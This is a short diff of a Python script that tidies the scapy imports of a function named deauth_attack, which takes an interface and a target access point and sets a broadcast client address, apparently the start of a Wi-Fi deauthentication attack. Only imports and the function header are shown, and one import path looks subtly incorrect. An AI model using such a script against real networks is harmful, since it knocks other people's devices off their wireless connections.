@@ -1,4 +1,5 @@
-from scapy.all import *
+from scapy.all import sendp, Dot11Deauth
+from scapy.layers import Dot11, RadioTap
 
 def deauth_attack(iface, target_bssid):
     client_mac = "ff:ff:ff:ff:ff:ff"  # broadcast
